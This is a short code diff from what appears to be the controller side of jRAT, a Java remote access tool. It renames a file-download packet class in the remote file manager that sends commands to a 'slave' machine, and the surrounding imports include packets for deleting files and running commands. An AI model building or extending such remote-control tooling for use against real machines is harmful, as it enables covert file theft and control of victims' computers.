@@ -54,7 +54,7 @@ import se.jrat.client.io.FileSystem;
 import se.jrat.client.listeners.DirListener;
 import se.jrat.client.packets.outgoing.Packet15ListFiles;
 import se.jrat.client.packets.outgoing.Packet16DeleteFile;
-import se.jrat.client.packets.outgoing.Packet21GetFile;
+import se.jrat.client.packets.outgoing.Packet21ServerDownloadFile;
 import se.jrat.client.packets.outgoing.Packet38RunCommand;
 import se.jrat.client.packets.outgoing.Packet43CreateDirectory;
 import se.jrat.client.packets.outgoing.Packet47RenameFile;
@@ -936,7 +936,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				FileData data = new FileData(slave);
 				data.setLocalFile(f.getSelectedFile());
 
-				slave.addToSendQueue(new Packet21GetFile(file));
+				slave.addToSendQueue(new Packet21ServerDownloadFile(file));
 				for (int i = 1; i < rows.length; i++) {
 					int row = rows[i];
 					if (model.getValueAt(row, 1).toString().length() > 0) {
@@ -959,7 +959,7 @@ public class FrameRemoteFiles extends BaseFrame {
 				if (model.getValueAt(row, 1).toString().length() > 0) {
 					FileData data = new FileData(slave);
 					data.setLocalFile(f.getSelectedFile());
-					slave.addToSendQueue(new Packet21GetFile(file));
+					slave.addToSendQueue(new Packet21ServerDownloadFile(file));
 				}
 			}
 		}
